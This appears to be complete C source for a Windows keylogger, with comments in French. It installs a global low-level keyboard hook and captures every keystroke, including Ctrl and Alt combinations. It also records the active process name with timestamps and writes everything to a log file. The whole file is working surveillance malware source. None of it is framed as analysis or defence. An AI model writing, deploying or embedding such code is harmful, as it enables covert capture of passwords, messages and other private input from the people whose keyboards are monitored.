#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

// Variables globales
HHOOK   g_hook;
FILE*   g_logfile;
HWND    g_last_window = NULL;  // Dernière fenêtre enregistrée
char    g_last_process[MAX_PATH] = "";  // Dernier processus enregistré

// Prototypes de fonctions
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static void write_to_log(const char* str);
static void log_new_window(const char* process_name);
static const char* get_special_key_name(DWORD vkCode);
static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);

// Fonction principale
int main(void)
{
    // Ouvrir le fichier log
    g_logfile = fopen("keystrokes.log", "a");
    if (g_logfile == NULL) {
        MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
        return 1;
    }

    // Installer le hook
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_hook == NULL) {
        MessageBox(NULL, "Erreur lors de l'installation du hook.", "Erreur", MB_ICONERROR);
        fclose(g_logfile);
        return 1;
    }

    // Boucle de message
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyage
    UnhookWindowsHookEx(g_hook);
    fclose(g_logfile);
    return 0;
}

// Fonction de hook pour capturer les frappes
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        char key[32] = { 0 };

        // Récupérer l'état du clavier
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Vérifier l'état de Shift et de Caps Lock
        BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||
			pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||
			pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE ||
            pKeyboard->vkCode == VK_SPACE) {
			strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
		}
		else { // La touche est une touche spéciale
			strcpy(key, get_special_key_name(pKeyboard->vkCode));
        }

		if (strcmp(key, "") == 0) {
			return CallNextHookEx(g_hook, nCode, wParam, lParam);
		}

        // Gérer les combinaisons de touches (e.g., Ctrl+C)
        char tmp_key[32] = { 0 };
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            sprintf(tmp_key, "[Ctrl+%s]", key);
			strcpy(key, tmp_key);
        }
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // Alt key
            sprintf(tmp_key, "[Alt+%s]", key);
			strcpy(key, tmp_key);
        }

        // Écrire la touche dans le fichier log
        write_to_log(key);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// Fonction pour enregistrer le changement de fenêtre
static void log_new_window(const char* process_name)
{
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s)\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec,
        process_name);
    fflush(g_logfile);
}

// Fonction pour écrire dans le fichier log
static void write_to_log(const char* str)
{
    // Obtenir la fenêtre et le processus en premier plan
    HWND foreground_window = GetForegroundWindow();
    DWORD pid;
    GetWindowThreadProcessId(foreground_window, &pid);

    if (foreground_window != g_last_window) {
        // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
        g_last_window = foreground_window;

        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (process) {
            char process_name[MAX_PATH] = "<Unknown>";
            GetModuleFileNameEx(process, NULL, process_name, MAX_PATH);
            strcpy(process_name, PathFindFileName(process_name));
            CloseHandle(process);

            // Log the new process and window
            if (strcmp(g_last_process, process_name) != 0) {
                strcpy(g_last_process, process_name);
            }
            log_new_window(process_name);
        }
    }
    fprintf(g_logfile, "%s", str);
    fflush(g_logfile);
}

static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
{
    static char key[2] = { 0 }; // Static pour retourner un pointeur valide

    // Conversion de la touche en fonction de l'état actuel du clavier
    if (ToAscii(vkCode, scanCode, keyboardState, (LPWORD)key, 0) == 1) {
        if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
            // Convertir en majuscule
            key[0] = (char)toupper(key[0]);
        }
        else if (!isShiftPressed && !isCapsLockOn) {
            // Convertir en minuscule
            key[0] = (char)tolower(key[0]);
        }
    }
    else {
        return "[Unknown Key]";
    }

    return key;
}

static const char* get_special_key_name(DWORD vkCode)
{
    switch (vkCode) {
    case VK_TAB:
        return "[Tab]";
    case VK_RETURN:
        return "[Enter]";
    case VK_BACK:
        return "[Backspace]";
	case VK_CAPITAL:
		return "";   
    case VK_ESCAPE:
        return "[Esc]";
    case VK_SPACE:
        return "[Space]";
    case VK_PRIOR:
        return "[Page Up]";
    case VK_NEXT:
        return "[Page Down]";
    case VK_END:
        return "[End]";
    case VK_HOME:
        return "[Home]";
    case VK_LEFT:
        return "[Left Arrow]";
    case VK_UP:
        return "[Up Arrow]";
    case VK_RIGHT:
        return "[Right Arrow]";
    case VK_DOWN:
        return "[Down Arrow]";
    case VK_INSERT:
        return "[Insert]";
    case VK_DELETE:
        return "[Delete]";
    case VK_LWIN:
        return "[Left Windows]";
    case VK_RWIN:
        return "[Right Windows]";
    case VK_APPS:
        return "[Application]";
    case VK_SLEEP:
        return "[Sleep]";
    case VK_NUMPAD0:
        return "[Numpad 0]";
    case VK_NUMPAD1:
        return "[Numpad 1]";
    case VK_NUMPAD2:
        return "[Numpad 2]";
    case VK_NUMPAD3:
        return "[Numpad 3]";
    case VK_NUMPAD4:
        return "[Numpad 4]";
    case VK_NUMPAD5:
        return "[Numpad 5]";
    case VK_NUMPAD6:
        return "[Numpad 6]";
    case VK_NUMPAD7:
        return "[Numpad 7]";
    case VK_NUMPAD8:
        return "[Numpad 8]";
    case VK_NUMPAD9:
        return "[Numpad 9]";
    case VK_MULTIPLY:
        return "[Numpad *]";
    case VK_ADD:
        return "[Numpad +]";
    case VK_SEPARATOR:
        return "[Numpad Separator]";
    case VK_SUBTRACT:
        return "[Numpad -]";
    case VK_DECIMAL:
        return "[Numpad .]";
    case VK_DIVIDE:
        return "[Numpad /]";
    case VK_F1:
        return "[F1]";
    case VK_F2:
        return "[F2]";
    case VK_F3:
        return "[F3]";
    case VK_F4:
        return "[F4]";
    case VK_F5:
        return "[F5]";
    case VK_F6:
        return "[F6]";
    case VK_F7:
        return "[F7]";
    case VK_F8:
        return "[F8]";
    case VK_F9:
        return "[F9]";
    case VK_F10:
        return "[F10]";
    case VK_F11:
        return "[F11]";
    case VK_F12:
        return "[F12]";
    case VK_NUMLOCK:
        return "[Num Lock]";
    case VK_SCROLL:
        return "[Scroll Lock]";
    case VK_LSHIFT:
        return "";
    case VK_RSHIFT:
        return "";
    case VK_LCONTROL:
        return "";
    case VK_RCONTROL:
        return "";
    case VK_LMENU:
        return "";
    case VK_RMENU:
        return "";
    case VK_VOLUME_MUTE:
        return "[Volume Mute]";
    case VK_VOLUME_DOWN:
        return "[Volume Down]";
    case VK_VOLUME_UP:
        return "[Volume Up]";
    case VK_MEDIA_NEXT_TRACK:
        return "[Next Track]";
    case VK_MEDIA_PREV_TRACK:
        return "[Previous Track]";
    case VK_MEDIA_STOP:
        return "[Stop Media]";
    case VK_MEDIA_PLAY_PAUSE:
        return "[Play/Pause Media]";
    case VK_LAUNCH_MAIL:
        return "[Launch Mail]";
    case VK_LAUNCH_MEDIA_SELECT:
        return "[Launch Media Select]";
    case VK_LAUNCH_APP1:
        return "[Launch App 1]";
    case VK_LAUNCH_APP2:
        return "[Launch App 2]";
    case VK_BROWSER_BACK:
        return "[Browser Back]";
    case VK_BROWSER_FORWARD:
        return "[Browser Forward]";
    case VK_BROWSER_REFRESH:
        return "[Browser Refresh]";
    case VK_BROWSER_STOP:
        return "[Browser Stop]";
    case VK_BROWSER_SEARCH:
        return "[Browser Search]";
    case VK_BROWSER_FAVORITES:
        return "[Browser Favorites]";
    case VK_BROWSER_HOME:
        return "[Browser Home]";
    case VK_OEM_1:
        return "[OEM 1 (;:)]";
    case VK_OEM_PLUS:
        return "[OEM Plus (+)]";
    case VK_OEM_COMMA:
        return "[OEM Comma (,)]";
    case VK_OEM_MINUS:
        return "[OEM Minus (-)]";
    case VK_OEM_PERIOD:
        return "[OEM Period (.)]";
    case VK_OEM_2:
        return "[OEM 2 (/?) ]";
    case VK_OEM_3:
        return "[OEM 3 (`~)]";
    case VK_OEM_4:
        return "[OEM 4 ([{)]";
    case VK_OEM_5:
        return "[OEM 5 (\\|)]";
    case VK_OEM_6:
        return "[OEM 6 (]}])]";
    case VK_OEM_7:
        return "[OEM 7 ('\") ]";
    case VK_OEM_8:
        return "[OEM 8]";
    case VK_OEM_102:
        return "[OEM 102 (<|>)]";
    default:
        return "[Unknown Key]";
    }
}
